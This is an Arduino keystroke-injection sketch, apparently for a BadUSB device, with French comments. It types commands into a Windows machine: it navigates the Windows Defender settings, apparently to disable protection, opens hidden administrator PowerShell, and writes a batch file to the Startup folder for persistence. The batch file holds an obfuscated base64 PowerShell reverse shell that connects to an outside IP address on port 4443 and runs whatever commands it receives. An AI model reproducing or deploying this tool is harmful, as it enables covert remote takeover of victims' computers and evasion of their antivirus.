#include "Keyboard.h"
void setup() {
  
  bypass();

  delay(100);

  powershell();

  delay(1000);

  createfile();
  //command
  payload();
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(100);
  Keyboard.print("Set-Content -Path $batFilePath -Value $batContent");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(200);
  Keyboard.print("\Start-Process -FilePath \"C:\\Users\\theob\\AppData");
  delay(100);
  Keyboard.print("\\Roaming\\Microsoft\\Windows");
  delay(100);
  Keyboard.print("\\Start Menu\\Programs");
  delay(100);
  Keyboard.print("\\Startup\\script.bat\" -Wait");
  delay(100);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.releaseAll();

  // Fermer le clavier virtuel.
  Keyboard.end();

}

void loop() {
  // put your main code here, to run repeatedly:

}

void createfile(){
  
  Keyboard.print("$batFilePath = \"C:\\Users\\theob\\AppData");
    delay(100);
  Keyboard.print("\\Roaming\\Microsoft\\Windows");
    delay(100);
  Keyboard.print("\\Start Menu\\Programs");
    delay(100);
  Keyboard.print("\\Startup");
    delay(100);
  Keyboard.print("\\script.bat\"");
    delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
   //early of command
  Keyboard.print("$batContent = \"powershell -ep bypass -e ");
  delay(100);
 
}

void powershell(){
   // Simuler la pression de la touche Windows.
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll(); // Relâcher toutes les touches.

  // Attendre que la boîte de dialogue Exécuter s'ouvre.
  delay(80);

  // Taper "powershell" puis appuyer sur Ctrl+Shift+Entrée pour ouvrir PowerShell en tant qu'administrateur.
  Keyboard.print("powershell -WindowStyle Hidden");
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);

  Keyboard.releaseAll();
  delay(1000);

  Keyboard.press(KEY_LEFT_ARROW); 
  Keyboard.release(KEY_LEFT_ARROW);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.releaseAll();
}

void bypass(){
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("windowsdefender:");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(100);
  for(int i = 0; i < 4; i++){
  
     Keyboard.press(KEY_TAB);
     Keyboard.release(KEY_TAB);
     delay(100);
 
 }
 Keyboard.press(KEY_RETURN);
 Keyboard.release(KEY_RETURN);
  for(int i = 0; i <= 4; i++){

    Keyboard.press(KEY_TAB);
    Keyboard.release(KEY_TAB);
    delay(200);

}
  Keyboard.press(KEY_SPACE);
  Keyboard.release(KEY_SPACE);
  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(200);


  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
}

void payload(){
  delay(50);
  Keyboard.print("UwB0AGEAcgB0AC0");
  delay(50);
  Keyboard.print("AUAByAG8AYwBlAH");
  delay(50);
  Keyboard.print("MAcwAgACQAUABTA");
  delay(50);
  Keyboard.print("EgATwBNAEUAXABw");
  delay(50);
  Keyboard.print("AG8AdwBlAHIAcwB");
  delay(50);
  Keyboard.print("oAGUAbABsAC4AZQ");
  delay(50);
  Keyboard.print("B4AGUAIAAtAEEAc");
  delay(50);
  Keyboard.print("gBnAHUAbQBlAG4A");
  delay(50);
  Keyboard.print("dABMAGkAcwB0ACA");
  delay(50);
  Keyboard.print("AewAkAGMAbABpAG");
  delay(50);
  Keyboard.print("UAbgB0ACAAPQAgA");
  delay(50);
  Keyboard.print("E4AZQB3AC0ATwBi");
  delay(50);
  Keyboard.print("AGoAZQBjAHQAIAB");
  delay(50);
  Keyboard.print("TAHkAcwB0AGUAbQ");
  delay(50);
  Keyboard.print("AuAE4AZQB0AC4AU");
  delay(50);
  Keyboard.print("wBvAGMAawBlAHQA");
  delay(50);
  Keyboard.print("cwAuAFQAQwBQAEM");
  delay(50);
  Keyboard.print("AbABpAGUAbgB0AC");
  delay(50);
  Keyboard.print("gAJwA4ADIALgAxA");
  delay(50);
  Keyboard.print("DIAMQAuADEANwAw");
  delay(50);
  Keyboard.print("AC4AMQA4ADIAJwA");
  delay(50);
  Keyboard.print("sADQANAA0ADMAKQ");
  delay(50);
  Keyboard.print("A7ACQAcwB0AHIAZ");
  delay(50);
  Keyboard.print("QBhAG0AIAA9ACAA");
  delay(50);
  Keyboard.print("JABjAGwAaQBlAG4");
  delay(50);
  Keyboard.print("AdAAuAEcAZQB0AF");
  delay(50);
  Keyboard.print("MAdAByAGUAYQBtA");
  delay(50);
  Keyboard.print("CgAKQA7AFsAYgB5");
  delay(50);
  Keyboard.print("AHQAZQBbAF0AXQA");
  delay(50);
  Keyboard.print("kAGIAeQB0AGUAcw");
  delay(50);
  Keyboard.print("AgAD0AIAAwAC4AL");
  delay(50);
  Keyboard.print("gA2ADUANQAzADUA");
  delay(50);
  Keyboard.print("fAAlAHsAMAB9ADs");
  delay(50);
  Keyboard.print("AdwBoAGkAbABlAC");
  delay(50);
  Keyboard.print("gAKAAkAGkAIAA9A");
  delay(50);
  Keyboard.print("CAAJABzAHQAcgBl");
  delay(50);
  Keyboard.print("AGEAbQAuAFIAZQB");
  delay(50);
  Keyboard.print("hAGQAKAAkAGIAeQ");
  delay(50);
  Keyboard.print("B0AGUAcwAsACAAM");
  delay(50);
  Keyboard.print("AAsACAAJABiAHkA");
  delay(50);
  Keyboard.print("dABlAHMALgBMAGU");
  delay(50);
  Keyboard.print("AbgBnAHQAaAApAC");
  delay(50);
  Keyboard.print("kAIAAtAG4AZQAgA");
  delay(50);
  Keyboard.print("DAAKQB7ADsAJABk");
  delay(50);
  Keyboard.print("AGEAdABhACAAPQA");
  delay(50);
  Keyboard.print("gACgATgBlAHcALQ");
  delay(50);
  Keyboard.print("BPAGIAagBlAGMAd");
  delay(50);
  Keyboard.print("AAgAC0AVAB5AHAA");
  delay(50);
  Keyboard.print("ZQBOAGEAbQBlACA");
  delay(50);
  Keyboard.print("AUwB5AHMAdABlAG");
  delay(50);
  Keyboard.print("0ALgBUAGUAeAB0A");
  delay(50);
  Keyboard.print("C4AQQBTAEMASQBJ");
  delay(50);
  Keyboard.print("AEUAbgBjAG8AZAB");
  delay(50);
  Keyboard.print("pAG4AZwApAC4ARw");
  delay(50);
  Keyboard.print("BlAHQAUwB0AHIAa");
  delay(50);
  Keyboard.print("QBuAGcAKAAkAGIA");
  delay(50);
  Keyboard.print("eQB0AGUAcwAsADA");
  delay(50);
  Keyboard.print("ALAAgACQAaQApAD");
  delay(50);
  Keyboard.print("sAJABzAGUAbgBkA");
  delay(50);
  Keyboard.print("GIAYQBjAGsAIAA9");
  delay(50);
  Keyboard.print("ACAAKABpAGUAeAA");
  delay(50);
  Keyboard.print("gACQAZABhAHQAYQ");
  delay(50);
  Keyboard.print("AgADIAPgAmADEAI");
  delay(50);
  Keyboard.print("AB8ACAATwB1AHQA");
  delay(50);
  Keyboard.print("LQBTAHQAcgBpAG4");
  delay(50);
  Keyboard.print("AZwAgACkAOwAkAH");
  delay(50);
  Keyboard.print("MAZQBuAGQAYgBhA");
  delay(50);
  Keyboard.print("GMAawAyACAAPQAgA");
  delay(50);
  Keyboard.print("CQAcwBlAG4AZABiA");
  delay(50);
  Keyboard.print("GEAYwBrACAAKwAg");
  delay(50);
  Keyboard.print("ACcAUABTACAAJwA");
  delay(50);
  Keyboard.print("gACsAIAAoAHAAdw");
  delay(50);
  Keyboard.print("BkACkALgBQAGEAd");
  delay(50);
  Keyboard.print("ABoACAAKwAgACcA");
  delay(50);
  Keyboard.print("PgAgACcAOwAkAHM");
  delay(50);
  Keyboard.print("AZQBuAGQAYgB5AH");
  delay(50);
  Keyboard.print("QAZQAgAD0AIAAoA");
  delay(50);
  Keyboard.print("FsAdABlAHgAdAAu");
  delay(50);
  Keyboard.print("AGUAbgBjAG8AZAB");
  delay(50);
  Keyboard.print("pAG4AZwBdADoAOgB");
  delay(50);
  Keyboard.print("BAFMAQwBJAEkAKQ");
  delay(50);
  Keyboard.print("AuAEcAZQB0AEIAe");
  delay(50);
  Keyboard.print("QB0AGUAcwAoACQA");
  delay(50);
  Keyboard.print("cwBlAG4AZABiAGE");
  delay(50);
  Keyboard.print("AYwBrADIAKQA7AC");
  delay(50);
  Keyboard.print("QAcwB0AHIAZQBhA");
  delay(50);
  Keyboard.print("G0ALgBXAHIAaQB0");
  delay(50);
  Keyboard.print("AGUAKAAkAHMAZQB");
  delay(50);
  Keyboard.print("uAGQAYgB5AHQAZQ");
  delay(50);
  Keyboard.print("AsADAALAAkAHMAZ");
  delay(50);
  Keyboard.print("QBuAGQAYgB5AHQA");
  delay(50);
  Keyboard.print("ZQAuAEwAZQBuAGc");
  delay(50);
  Keyboard.print("AdABoACkAOwAkAHM");
  delay(50);
  Keyboard.print("AdAByAGUAYQBtAC4");
  delay(50);
  Keyboard.print("ARgBsAHUAcwBoACg");
  delay(50);
  Keyboard.print("AKQB9ADsAJABjAGw");
  delay(50);
  Keyboard.print("AaQBlAG4AdAAuAEM");
  delay(50);
  Keyboard.print("AbABvAHMAZQAoACk");
  delay(50);
  Keyboard.print("AfQAgAC0AVwBpAG4");
  delay(50);
  Keyboard.print("AZABvAHcAUwB0AHk");
  delay(50);
  Keyboard.print("AbABlACAASABpAGQ");
  delay(50);
  Keyboard.print("AZABlAG4A\"");
  
}